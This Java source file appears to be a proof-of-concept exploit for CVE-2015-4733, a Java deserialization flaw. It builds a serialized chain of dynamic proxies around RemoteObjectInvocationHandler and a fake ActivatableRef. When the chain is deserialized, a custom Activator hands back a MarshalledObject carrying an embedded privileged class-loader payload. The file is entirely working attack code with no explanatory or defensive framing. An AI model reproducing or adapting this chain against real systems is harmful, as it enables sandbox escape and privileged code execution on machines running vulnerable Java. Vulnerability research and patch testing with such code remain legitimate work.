package poc.cve_2015_4733;

import java.io.ByteArrayOutputStream;
import java.io.ObjectOutput;
import java.io.ObjectOutputStream;
import java.io.Serializable;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Method;
import java.lang.reflect.Proxy;
import java.rmi.MarshalledObject;
import java.rmi.Remote;
import java.rmi.RemoteException;
import java.rmi.activation.ActivationException;
import java.rmi.activation.ActivationID;
import java.rmi.activation.UnknownObjectException;
import java.rmi.server.RemoteObjectInvocationHandler;
import java.rmi.server.RemoteRef;

import poc.shared.EmbeddedObject;
import poc.shared.PrivClassLoader;
import poc.shared.Utils;

public class RMIChain {
	
	@SuppressWarnings("rawtypes")
	public static byte[] createChain( ) throws Throwable {
		final ClassLoader cl = RMIChain.class.getClassLoader();
		final Class[] aInterfaces = {
			RemoteRef.class	
		};
		final Class[] roihInterfaces = {
				Remote.class,
				Finalizer.class
		};
		
		RemoteRef activatable = ( RemoteRef ) Proxy.newProxyInstance( cl, aInterfaces, new ActivatableRefProxy( ) );
		RemoteObjectInvocationHandler roih = new RemoteObjectInvocationHandler( activatable );
		Object root = Proxy.newProxyInstance( cl, roihInterfaces, roih );
		
		ByteArrayOutputStream byteOut = new ByteArrayOutputStream( );
		ObjectOutputStream objOut = new ObjectOutputStream( byteOut );
		
		objOut.writeObject( root );
		objOut.close();
		
		return byteOut.toByteArray();
	}
	
	public static class ActivatableRefProxy implements InvocationHandler {

		@Override
		public Object invoke( Object proxy, Method method, Object[] args ) throws Throwable {
			final String methodName = method.getName();
			if( methodName.equals( "getRefClass" ) ) {
				return "ActivatableRef";
			}
			else if( methodName.equals( "writeExternal" ) ) {
				ObjectOutput out = ( ObjectOutput ) args[ 0 ];
				
				out.writeObject( new ActivationIDProxy( ) );
				out.writeUTF( "" );
				
				return null;
			}
			else if( methodName.equals( "invoke" ) ) {
				return null;
			}
			
			Utils.log( "Method not implemented: %s.", method );
			throw new AssertionError( "Method not implemented: " + method );
		}
		
	}
	
	public static class ActivationIDProxy implements Serializable {

		private static final long serialVersionUID = -7647930698426975851L;
		
		public Object readResolve( ) {
			return new ActivationID( new Activator( ) );
		}
		
	}
	
	public static class Activator implements java.rmi.activation.Activator {

		@Override
		@SuppressWarnings({ "rawtypes", "unchecked" })
		public MarshalledObject activate( ActivationID id, boolean force ) throws ActivationException, UnknownObjectException, RemoteException {
			try {
				return new MarshalledObject( EmbeddedObject.createEmbeddedObject( PrivClassLoader.SERIAL_DATA ) );
			}
			catch( Throwable t ) {
				t.printStackTrace();
				return null;
			}
		}
		
	}

	
}
